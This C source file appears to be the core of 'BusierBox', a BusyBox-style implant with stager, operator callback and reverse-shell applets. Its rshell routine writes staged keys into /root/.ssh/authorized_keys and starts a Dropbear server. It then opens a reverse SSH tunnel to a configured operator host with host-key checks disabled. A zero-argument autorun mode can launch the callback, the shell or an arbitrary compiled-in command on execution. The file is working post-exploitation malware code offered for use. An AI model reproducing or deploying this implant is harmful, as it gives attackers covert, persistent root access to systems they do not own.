#define _POSIX_C_SOURCE 200809L

#include <errno.h>
#include <fcntl.h>
#include <limits.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

#include "applets.h"

#ifndef PATH_MAX
#define PATH_MAX 4096
#endif

#ifndef BB_ENABLE_SURVEY
#define BB_ENABLE_SURVEY 1
#endif
#ifndef BB_ENABLE_DOCTOR
#define BB_ENABLE_DOCTOR 1
#endif
#ifndef BB_ENABLE_CONFIG_INFO
#define BB_ENABLE_CONFIG_INFO 1
#endif
#ifndef BB_ENABLE_EXTRACT
#define BB_ENABLE_EXTRACT 1
#endif
#ifndef BB_ENABLE_FETCH_FULL
#define BB_ENABLE_FETCH_FULL 1
#endif
#ifndef BB_ENABLE_CALLBACK
#define BB_ENABLE_CALLBACK 1
#endif
#ifndef BUSIERBOX_ARTIFACT_TIER
#define BUSIERBOX_ARTIFACT_TIER "full"
#endif
#ifndef BB_ARTIFACT_KIND
#define BB_ARTIFACT_KIND BUSIERBOX_ARTIFACT_TIER
#endif
#ifndef BB_STAGER_ZERO_ARG_MODE
#define BB_STAGER_ZERO_ARG_MODE "help"
#endif
#ifndef BB_FULL_ZERO_ARG_MODE
#define BB_FULL_ZERO_ARG_MODE "help"
#endif
#ifndef BB_ZERO_ARG_CUSTOM_COMMAND
#define BB_ZERO_ARG_CUSTOM_COMMAND ""
#endif
#ifndef BB_RSHELL_MODE
#define BB_RSHELL_MODE "ssh"
#endif
#ifndef BB_AUTORUN_GUARD_ENABLE
#define BB_AUTORUN_GUARD_ENABLE "yes"
#endif
#ifndef BB_AUTORUN_GUARD_PATH
#define BB_AUTORUN_GUARD_PATH "/tmp/busierbox-autorun"
#endif
#ifndef BB_AUTORUN_REENTRY_ACTION
#define BB_AUTORUN_REENTRY_ACTION "status"
#endif
#ifndef BB_AUTORUN_STALE_LOCK_POLICY
#define BB_AUTORUN_STALE_LOCK_POLICY "recover"
#endif
#ifndef BB_OPERATOR_SERVER_HOST
#define BB_OPERATOR_SERVER_HOST ""
#endif
#ifndef BB_OPERATOR_SERVER_USER
#define BB_OPERATOR_SERVER_USER "operator"
#endif
#ifndef BB_OPERATOR_SERVER_SSH_PORT
#define BB_OPERATOR_SERVER_SSH_PORT "22"
#endif
#ifndef BB_OPERATOR_REMOTE_FORWARD_PORT
#define BB_OPERATOR_REMOTE_FORWARD_PORT "2200"
#endif
#ifndef BB_OPERATOR_TARGET_DROPBEAR_PORT
#define BB_OPERATOR_TARGET_DROPBEAR_PORT "2222"
#endif
#ifndef BB_OPERATOR_TARGET_BIND_HOST
#define BB_OPERATOR_TARGET_BIND_HOST "127.0.0.1"
#endif
#ifndef BB_OPERATOR_KNOWN_HOSTS_POLICY
#define BB_OPERATOR_KNOWN_HOSTS_POLICY "off"
#endif

const struct bb_applet bb_applets[] = {
    {"list", applet_list_main, "list native applets and payload tools"},
#if BB_ENABLE_SURVEY
    {"survey", applet_survey_main, "print embedded Linux triage information"},
#endif
    {"envfix", applet_envfix_main, "print or apply environment repair commands"},
#if BB_ENABLE_EXTRACT
    {"extract", applet_extract_main, "extract or reuse the payload runtime"},
#endif
    {"clean", applet_clean_main, "remove local extracted payload runtime"},
#if BB_ENABLE_CONFIG_INFO
    {"config-info", applet_config_info_main, "print build and payload information"},
#endif
#if BB_ENABLE_DOCTOR
    {"doctor", applet_doctor_main, "inspect embedded and extracted payload health"},
#endif
#if BB_ENABLE_FETCH_FULL
    {"fetch-full", applet_fetch_full_main, "download a full BusierBox artifact"},
#endif
#if BB_ENABLE_CALLBACK
    {"callback", applet_callback_main, "call back to operator station using stager protocol"},
#endif
    {"rshell", applet_rshell_main, "start configured reverse shell transport"},
};

const unsigned int bb_applet_count = sizeof(bb_applets) / sizeof(bb_applets[0]);

static const char *base_name(const char *path)
{
    const char *slash = strrchr(path, '/');
    return slash ? slash + 1 : path;
}

static void usage(FILE *out)
{
    bb_print_applet_list(out);
}

static int yes_value(const char *s)
{
    return s && (!strcmp(s, "yes") || !strcmp(s, "1") || !strcmp(s, "true") || !strcmp(s, "on"));
}

int bb_dispatch(const char *name, int argc, char **argv)
{
    unsigned int i;

    for (i = 0; i < bb_applet_count; i++) {
        if (strcmp(name, bb_applets[i].name) == 0)
            return bb_applets[i].main(argc, argv);
    }

    return -1;
}

static int mkdir_p(const char *path)
{
    char tmp[PATH_MAX];
    char *p;
    if (!path || !*path)
        return -1;
    snprintf(tmp, sizeof(tmp), "%s", path);
    for (p = tmp + 1; *p; p++) {
        if (*p == '/') {
            *p = '\0';
            if (mkdir(tmp, 0700) != 0 && errno != EEXIST)
                return -1;
            *p = '/';
        }
    }
    if (mkdir(tmp, 0700) != 0 && errno != EEXIST)
        return -1;
    return 0;
}

static int read_lock_pid(const char *lock_path, long *pid, char *mode, size_t modesz)
{
    FILE *fp = fopen(lock_path, "r");
    char key[64], val[128];
    *pid = -1;
    if (mode && modesz)
        mode[0] = '\0';
    if (!fp)
        return -1;
    while (fscanf(fp, "%63[^=]=%127s\n", key, val) == 2) {
        if (!strcmp(key, "pid"))
            *pid = strtol(val, NULL, 10);
        else if (!strcmp(key, "mode") && mode && modesz)
            snprintf(mode, modesz, "%s", val);
    }
    fclose(fp);
    return 0;
}

static const char *autorun_guard_path(void)
{
    const char *env = getenv("BUSIERBOX_AUTORUN_GUARD_PATH");
    return env && *env ? env : BB_AUTORUN_GUARD_PATH;
}

static void print_autorun_status(FILE *out)
{
    char lock_path[PATH_MAX], mode[128] = "";
    const char *guard_path = autorun_guard_path();
    long pid = -1;
    snprintf(lock_path, sizeof(lock_path), "%s/autorun.lock", guard_path);
    read_lock_pid(lock_path, &pid, mode, sizeof(mode));
    fprintf(out, "BusierBox autorun already active.\n");
    fprintf(out, "  mode: %s\n", mode[0] ? mode : "unknown");
    fprintf(out, "  pid: %ld\n", pid);
    fprintf(out, "  guard: %s\n\n", guard_path);
    fprintf(out, "Explicit commands still work:\n");
    fprintf(out, "  busierbox doctor\n");
    fprintf(out, "  busierbox --help\n");
}

static int reentry_action(void)
{
    char *doctor_argv[] = { "doctor", NULL };
    if (!strcmp(BB_AUTORUN_REENTRY_ACTION, "doctor"))
        return applet_doctor_main(1, doctor_argv);
    if (!strcmp(BB_AUTORUN_REENTRY_ACTION, "help") || !strcmp(BB_AUTORUN_REENTRY_ACTION, "menu")) {
        usage(stdout);
        return 0;
    }
    print_autorun_status(stdout);
    return 0;
}

static int guard_needed(const char *mode)
{
    return !strcmp(mode, "callback") || !strcmp(mode, "shell") || !strcmp(mode, "custom");
}

static int acquire_autorun_guard(const char *mode)
{
    char lock_path[PATH_MAX], status_path[PATH_MAX], old_mode[128] = "";
    const char *guard_path = autorun_guard_path();
    long old_pid = -1;
    int fd;
    time_t now;
    if (!yes_value(BB_AUTORUN_GUARD_ENABLE) || !guard_needed(mode) ||
        (!strcmp(BB_AUTORUN_REENTRY_ACTION, "bootstrap-again") ||
         !strcmp(BB_AUTORUN_REENTRY_ACTION, "shell-again")))
        return 1;
    if (mkdir_p(guard_path) != 0) {
        fprintf(stderr, "autorun: unable to create guard path %s: %s\n", guard_path, strerror(errno));
        return 0;
    }
    snprintf(lock_path, sizeof(lock_path), "%s/autorun.lock", guard_path);
retry:
    fd = open(lock_path, O_CREAT | O_EXCL | O_WRONLY, 0600);
    if (fd < 0) {
        if (errno == EEXIST) {
            if (read_lock_pid(lock_path, &old_pid, old_mode, sizeof(old_mode)) == 0 &&
                old_pid > 0 && kill((pid_t)old_pid, 0) != 0 && errno == ESRCH &&
                !strcmp(BB_AUTORUN_STALE_LOCK_POLICY, "recover")) {
                unlink(lock_path);
                goto retry;
            }
            reentry_action();
            return 0;
        }
        fprintf(stderr, "autorun: unable to create lock %s: %s\n", lock_path, strerror(errno));
        return 0;
    }
    now = time(NULL);
    dprintf(fd, "mode=%s\npid=%ld\nstarted_at=%ld\nartifact_tier=%s\n", mode, (long)getpid(), (long)now, BUSIERBOX_ARTIFACT_TIER);
    close(fd);
    snprintf(status_path, sizeof(status_path), "%s/status", guard_path);
    fd = open(status_path, O_CREAT | O_TRUNC | O_WRONLY, 0600);
    if (fd >= 0) {
        dprintf(fd, "mode=%s\npid=%ld\nstarted_at=%ld\nartifact_tier=%s\n", mode, (long)getpid(), (long)now, BUSIERBOX_ARTIFACT_TIER);
        close(fd);
    }
    return 1;
}

static void shquote_append(char *dst, size_t dstsz, const char *src)
{
    size_t used = strlen(dst);
    const char *p;
    if (used + 2 >= dstsz)
        return;
    dst[used++] = '\'';
    dst[used] = '\0';
    for (p = src ? src : ""; *p; p++) {
        if (*p == '\'') {
            if (used + 4 >= dstsz)
                break;
            memcpy(dst + used, "'\\''", 4);
            used += 4;
        } else {
            if (used + 1 >= dstsz)
                break;
            dst[used++] = *p;
        }
        dst[used] = '\0';
    }
    if (used + 1 < dstsz) {
        dst[used++] = '\'';
        dst[used] = '\0';
    }
}

static int path_exec(const char *path)
{
    return path && *path && access(path, X_OK) == 0;
}

int applet_rshell_main(int argc, char **argv)
{
    char payload[PATH_MAX], dropbear[PATH_MAX], dbclient[PATH_MAX], dropbearkey[PATH_MAX];
    char hostkey[PATH_MAX], identity[PATH_MAX], authkeys[PATH_MAX], rootssh[PATH_MAX];
    char cmd[8192] = "";
    int rc;

    if (argc > 1 && (!strcmp(argv[1], "--help") || !strcmp(argv[1], "-h"))) {
        puts("usage: busierbox rshell");
        puts("Starts the configured reverse shell transport. Current transport: ssh/dropbear/dbclient.");
        return 0;
    }
    if (strcmp(BB_RSHELL_MODE, "ssh")) {
        fprintf(stderr, "rshell: unsupported transport '%s'\n", BB_RSHELL_MODE);
        return 2;
    }
    if (!BB_OPERATOR_SERVER_HOST[0]) {
        fputs("rshell: operator host is not configured; set it in menuconfig under Payload Options -> Applet configuration -> Reverse shell\n", stderr);
        return 2;
    }
    if (bb_ensure_payload_dir(payload, sizeof(payload)) != 0) {
        fputs("rshell: payload unavailable; cannot start Dropbear/dbclient\n", stderr);
        return 127;
    }
    snprintf(dropbear, sizeof(dropbear), "%s/bin/dropbear", payload);
    snprintf(dbclient, sizeof(dbclient), "%s/bin/dbclient", payload);
    snprintf(dropbearkey, sizeof(dropbearkey), "%s/bin/dropbearkey", payload);
    snprintf(hostkey, sizeof(hostkey), "%s/etc/dropbear/dropbear_rsa_host_key", payload);
    snprintf(identity, sizeof(identity), "%s/home/.ssh/id_dbclient", payload);
    snprintf(authkeys, sizeof(authkeys), "%s/home/.ssh/authorized_keys", payload);
    snprintf(rootssh, sizeof(rootssh), "%s", "/root/.ssh");

    if (!path_exec(dropbear) || !path_exec(dbclient)) {
        fputs("rshell: dropbear/dbclient are not staged; enable dropbear in Heavy tools and rebuild\n", stderr);
        return 127;
    }
    if (access(identity, R_OK) != 0) {
        fprintf(stderr, "rshell: dbclient identity not staged at %s; prepare reverse shell defaults in menuconfig and rebuild\n", identity);
        return 127;
    }

    strcat(cmd, "set -eu; ");
    strcat(cmd, "mkdir -p ");
    shquote_append(cmd, sizeof(cmd), rootssh);
    strcat(cmd, " ");
    strcat(cmd, "$(dirname ");
    shquote_append(cmd, sizeof(cmd), hostkey);
    strcat(cmd, "); ");
    strcat(cmd, "if [ -f ");
    shquote_append(cmd, sizeof(cmd), authkeys);
    strcat(cmd, " ]; then cat ");
    shquote_append(cmd, sizeof(cmd), authkeys);
    strcat(cmd, " >>/root/.ssh/authorized_keys 2>/dev/null || true; chmod 600 /root/.ssh/authorized_keys 2>/dev/null || true; fi; ");
    strcat(cmd, "if [ ! -f ");
    shquote_append(cmd, sizeof(cmd), hostkey);
    strcat(cmd, " ] && [ -x ");
    shquote_append(cmd, sizeof(cmd), dropbearkey);
    strcat(cmd, " ]; then ");
    shquote_append(cmd, sizeof(cmd), dropbearkey);
    strcat(cmd, " -t rsa -f ");
    shquote_append(cmd, sizeof(cmd), hostkey);
    strcat(cmd, " >/dev/null 2>&1 || true; fi; ");
    shquote_append(cmd, sizeof(cmd), dropbear);
    strcat(cmd, " -r ");
    shquote_append(cmd, sizeof(cmd), hostkey);
    strcat(cmd, " -p ");
    shquote_append(cmd, sizeof(cmd), BB_OPERATOR_TARGET_BIND_HOST ":" BB_OPERATOR_TARGET_DROPBEAR_PORT);
    strcat(cmd, " -F -E >/tmp/busierbox-dropbear.log 2>&1 & dbpid=$!; ");
    shquote_append(cmd, sizeof(cmd), dbclient);
    strcat(cmd, " -i ");
    shquote_append(cmd, sizeof(cmd), identity);
    if (!strcmp(BB_OPERATOR_KNOWN_HOSTS_POLICY, "off"))
        strcat(cmd, " -y");
    strcat(cmd, " -K 30 -N -R ");
    shquote_append(cmd, sizeof(cmd), "127.0.0.1:" BB_OPERATOR_REMOTE_FORWARD_PORT ":" BB_OPERATOR_TARGET_BIND_HOST ":" BB_OPERATOR_TARGET_DROPBEAR_PORT);
    strcat(cmd, " -p ");
    shquote_append(cmd, sizeof(cmd), BB_OPERATOR_SERVER_SSH_PORT);
    strcat(cmd, " ");
    shquote_append(cmd, sizeof(cmd), BB_OPERATOR_SERVER_USER "@" BB_OPERATOR_SERVER_HOST);
    strcat(cmd, " >/tmp/busierbox-dbclient.log 2>&1 & dcpid=$!; ");
    strcat(cmd, "echo rshell_started=yes; echo dropbear_pid=$dbpid; echo dbclient_pid=$dcpid; ");
    strcat(cmd, "echo connect_hint='ssh -p " BB_OPERATOR_REMOTE_FORWARD_PORT " root@127.0.0.1'");

    /* Use popen so we can capture the dropbear PID and write it to the autorun
     * guard lock.  This prevents a second zero-arg busierbox invocation (e.g.
     * from inside the reverse tunnel) from triggering another rshell while
     * dropbear is still alive. */
    {
        FILE *fp;
        char line[256];
        long dropbear_pid = -1;
        int exit_status = 0;

        fp = popen(cmd, "r");
        if (!fp)
            return 1;
        while (fgets(line, sizeof(line), fp)) {
            fputs(line, stdout);
            fflush(stdout);
            if (strncmp(line, "dropbear_pid=", 13) == 0)
                dropbear_pid = strtol(line + 13, NULL, 10);
        }
        rc = pclose(fp);
        if (rc != -1 && WIFEXITED(rc))
            exit_status = WEXITSTATUS(rc);

        /* Write/update the autorun guard lock with dropbear's PID so that
         * subsequent zero-arg invocations see a live process and block. */
        if (dropbear_pid > 0 && yes_value(BB_AUTORUN_GUARD_ENABLE)) {
            char lock_path[PATH_MAX];
            int lfd;
            const char *gp = autorun_guard_path();
            mkdir_p(gp);
            snprintf(lock_path, sizeof(lock_path), "%s/autorun.lock", gp);
            lfd = open(lock_path, O_CREAT | O_TRUNC | O_WRONLY, 0600);
            if (lfd >= 0) {
                dprintf(lfd, "mode=rshell\npid=%ld\nstarted_at=%ld\nartifact_tier=%s\n",
                        dropbear_pid, (long)time(NULL), BUSIERBOX_ARTIFACT_TIER);
                close(lfd);
            }
        }
        return exit_status;
    }
}

static int run_custom_zero_arg(void)
{
    int rc;
    if (!BB_ZERO_ARG_CUSTOM_COMMAND[0]) {
        fputs("zero-arg custom mode selected but BB_ZERO_ARG_CUSTOM_COMMAND is empty\n", stderr);
        return 2;
    }
    rc = system(BB_ZERO_ARG_CUSTOM_COMMAND);
    if (rc == -1)
        return 1;
    if (WIFEXITED(rc))
        return WEXITSTATUS(rc);
    return 1;
}

static int run_zero_arg_mode(const char *mode)
{
    char *callback_argv[] = { "callback", NULL };
    char *rshell_argv[] = { "rshell", NULL };

    if (!mode || !*mode || !strcmp(mode, "help") || !strcmp(mode, "menu") ||
        !strcmp(mode, "survey") || !strcmp(mode, "doctor")) {
        usage(!mode || !*mode || !strcmp(mode, "help") ? stderr : stdout);
        return !mode || !*mode || !strcmp(mode, "help") ? 2 : 0;
    }
    if (!strcmp(mode, "callback"))
        return applet_callback_main(1, callback_argv);
    if (!strcmp(mode, "shell") || !strcmp(mode, "bootstrap") || !strcmp(mode, "operator-session"))
        return applet_rshell_main(1, rshell_argv);
    if (!strcmp(mode, "custom"))
        return run_custom_zero_arg();
    fprintf(stderr, "unknown zero-arg mode: %s\n", mode);
    usage(stderr);
    return 2;
}

static int zero_arg_main(void)
{
    const char *mode = getenv("BUSIERBOX_ZERO_ARG_MODE");
    if (!mode || !*mode) {
        if (!strcmp(BUSIERBOX_ARTIFACT_TIER, "stager"))
            mode = BB_STAGER_ZERO_ARG_MODE;
        else
            mode = BB_FULL_ZERO_ARG_MODE;
    }
    if (getenv("BUSIERBOX_NO_AUTORUN") && !strcmp(getenv("BUSIERBOX_NO_AUTORUN"), "1")) {
        usage(stdout);
        return 0;
    }
    if (!acquire_autorun_guard(mode))
        return 0;
    return run_zero_arg_mode(mode);
}

int main(int argc, char **argv)
{
    const char *invoked;
    int rc;

    if (argc < 1 || !argv || !argv[0]) {
        usage(stderr);
        return 2;
    }
    bb_set_argv0(argv[0]);

    invoked = base_name(argv[0]);
    if (strcmp(invoked, "busierbox") != 0 && strncmp(invoked, "busierbox-", 10) != 0) {
        rc = bb_dispatch(invoked, argc, argv);
        if (rc >= 0)
            return rc;
        return bb_exec_payload_applet(invoked, argc, argv);
    }

    if (argc < 2)
        return zero_arg_main();

    if (strcmp(argv[1], "--help") == 0 || strcmp(argv[1], "-h") == 0) {
        usage(argc < 2 ? stderr : stdout);
        return 0;
    }

    rc = bb_dispatch(argv[1], argc - 1, argv + 1);
    if (rc >= 0)
        return rc;

    return bb_exec_payload_applet(argv[1], argc - 1, argv + 1);
}
